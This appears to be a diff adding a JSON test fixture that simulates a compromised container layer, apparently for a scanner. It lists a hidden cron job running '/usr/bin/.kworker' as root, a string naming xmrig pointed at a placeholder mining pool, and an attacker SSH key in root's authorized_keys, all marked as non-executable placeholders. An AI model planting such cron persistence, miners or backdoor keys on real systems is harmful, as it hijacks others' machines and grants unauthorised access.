@@ -1,0 +1,10 @@
+{
+  "note": "Simulated layer file listing. The 'miner' is a text string; nothing here is executable.",
+  "files": {
+    "/etc/cron.d/kworker": "*/10 * * * * root /usr/bin/.kworker",
+    "/usr/bin/.kworker": "SIMULATED-MINER xmrig stratum+tcp://pool.updates-miner.example:3333 wallet=FAKEWALLET",
+    "/root/.ssh/authorized_keys": "ssh-ed25519 AAAAFAKEKEYFAKEKEYFAKEKEY attacker@example",
+    "/etc/nginx/nginx.conf": "worker_processes 1;",
+    "/usr/share/doc/readme": "hello"
+  }
+}
